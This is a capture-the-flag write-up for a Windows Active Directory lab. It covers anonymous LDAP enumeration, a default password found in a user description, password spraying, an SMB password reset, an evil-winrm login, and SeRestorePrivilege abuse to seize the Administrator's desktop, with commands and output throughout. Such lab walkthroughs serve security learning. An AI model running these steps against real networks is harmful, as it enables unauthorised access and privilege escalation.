## Baby - Windows (Active Directory)

**Difficulty:** Easy
**OS:** Windows
**Domain:** `baby.vl`
**DC:** `BabyDC.baby.vl`

### LDAP Enumeration

With LDAP exposed, the next step is to check for an anonymous bind — a legacy misconfiguration that is still common on lab and real-world environments alike.

```bash
nmap -n -sV --script "ldap* and not brute" 10.10.65.83 -Pn
```

The `ldap-rootdse` script confirms the domain naming context and that the server accepts unauthenticated queries:

```
| ldap-rootdse:
| LDAP Results
|   <ROOT>
|       rootDomainNamingContext: DC=baby,DC=vl
|       ldapServiceName: baby.vl:babydc$@BABY.VL
|       defaultNamingContext: DC=baby,DC=vl
|       dnsHostName: BabyDC.baby.vl
```

A manual anonymous bind confirms full read access to the directory:

```bash
ldapsearch -x -H ldap://10.10.65.83 -D '' -w '' -b "DC=baby,DC=vl"
```

This dumps the entire domain — every user, group, and OU — without any credentials. Trimming the enumeration down to just usernames and OUs gives a clean picture of the environment:

```bash
ldapsearch -x -H ldap://10.10.84.204 -b "DC=baby,DC=vl" "user" | grep dn
```

### Credential Disclosure via User Description

Scrolling through the full LDAP dump, the `it` OU user `Teresa Bell` has an interesting `description` attribute set on her account object:

```
sAMAccountName: Teresa.Bell
description: Set initial password to BabyStart123!
```

This is a classic case of an admin leaving onboarding notes directly in Active Directory instead of a secure channel. `BabyStart123!` is very likely the default password issued to every new hire before they're forced to change it at first logon — a perfect candidate for a password spray.

```bash
crackmapexec smb 10.10.84.204 -u user.txt -p BabyStart123!
```

## Initial Access

Since the account still requires a password change, it can't authenticate normally yet. `smbpasswd` can perform the mandatory reset directly over SMB:

```bash
smbpasswd -U baby/caroline.robinson -r 10.10.84.204
```

With a new password set (`StartBaby123!` in this run), the account authenticates cleanly over WinRM:

```bash
evil-winrm -i 10.10.84.204 -u caroline.robinson -p 'StartBaby123!'

*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents>
```

The user flag is retrieved from the Desktop.

## Privilege Escalation

`whoami /priv` inside the WinRM session shows something immediately useful — Caroline Robinson holds backup and restore privileges:

```powershell
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

`SeBackupPrivilege` and `SeRestorePrivilege` together allow reading and writing *any* file on the filesystem, regardless of its ACL — including the ability to rewrite permissions on protected folders. Rather than doing a full raw NTDS/SAM extraction, the quickest path here is to abuse `SeRestorePrivilege` to grant ourselves full control over the Administrator's Desktop folder, using the [`Acl-FullControl.ps1`](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1) helper script:

```powershell
Import-Module .\Acl-FullControl.ps1

Acl-FullControl -user baby\caroline.robinson -path c:\users\administrator\desktop

[+] Current permissions:

Path   : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\desktop
Owner  : BUILTIN\Administrators
Group  : BABY\Domain Users
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BABY\Administrator Allow  FullControl

[+] Changing permissions to c:\users\administrator\desktop
[+] Acls changed successfully.

Path   : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\desktop
Owner  : BUILTIN\Administrators
Group  : BABY\Domain Users
Access : BABY\Caroline.Robinson Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BABY\Administrator Allow  FullControl
```

> **Note:** The Evil-WinRM session crashed while the script was running, but the ACL change had already been applied server-side. Reconnecting with a fresh session picked up right where it left off.

With `FullControl` now granted, the root flag can be pulled straight from the Administrator's desktop:

```powershell
download C:\Users\Administrator\Desktop\root.txt
```
